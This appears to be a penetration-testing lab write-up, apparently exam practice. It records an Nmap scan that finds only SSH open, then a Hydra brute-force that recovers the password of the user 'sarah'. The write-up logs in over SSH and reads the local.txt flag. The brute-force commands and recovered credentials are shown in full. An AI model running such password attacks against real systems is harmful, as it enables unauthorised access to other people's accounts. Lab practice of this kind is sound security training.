# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e:84:80:bd:8f:b6:51:7d:c1:87:db:8c:f4:f3:15:9e (RSA)
|   256 8c:98:44:30:1c:37:53:84:32:22:eb:e1:9c:06:68:06 (ECDSA)
|_  256 1b:db:c7:c9:36:54:b8:cf:ff:1a:2f:9a:91:b1:56:e4 (ED25519)
```

---

# Enumeration

---

# Exploit

```sh
┌──(koshi㉿kali)-[~/Exam/Lucky]
└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.104.112                    
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-23 10:35:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:8/p:10), ~5 tries per task
[DATA] attacking ssh://192.168.104.112:22/
[22][ssh] host: 192.168.104.112   login: sarah   password: !Password-Reset0000
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-23 10:36:32
                                                                                                                                                            
┌──(koshi㉿kali)-[~/Exam/Lucky]
└─$ ssh sarah@192.168.104.112      
The authenticity of host '192.168.104.112 (192.168.104.112)' can't be established.
ED25519 key fingerprint is: SHA256:z5EUW5VqN44sdRMYoZhLEaW3G10wnD1Y2Hy+rOBEuAc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.104.112' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sarah@192.168.104.112's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

97 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Thu Nov 25 03:27:43 2021 from 192.168.118.5
sarah@oscp:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  tools  Videos                                                                 
sarah@oscp:~$ cat local.txt
5a284b8ce32d31fc3666041cc1c03a98                                                                                                                            
sarah@oscp:~$ ifconfig                                                                                                                                      
                                                                                                                                                            
Command 'ifconfig' not found, but can be installed with:                                                                                                    
                                                                                                                                                            
apt install net-tools                                                                                                                                       
Please ask your administrator.                                                                                                                              
                                                                                                                                                            
sarah@oscp:~$ ip a                                                                                                                                          
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                                 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                   
    inet 127.0.0.1/8 scope host lo                                                                                                                          
       valid_lft forever preferred_lft forever                                                                                                              
    inet6 ::1/128 scope host                                                                                                                                
       valid_lft forever preferred_lft forever                                                                                                              
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000                                                             
    link/ether 00:50:56:8a:56:66 brd ff:ff:ff:ff:ff:ff                                                                                                      
    altname enp3s0                                                                                                                                          
    inet 192.168.104.112/24 brd 192.168.104.255 scope global noprefixroute ens160                                                                           
       valid_lft forever preferred_lft forever                                                                                                              
    inet6 fe80::250:56ff:fe8a:5666/64 scope link                                                                                                            
       valid_lft forever preferred_lft forever                                                                                                              
sarah@oscp:~$                                                                                                                                               
                                                                                 
```

![[Pasted image 20260223162704.png]]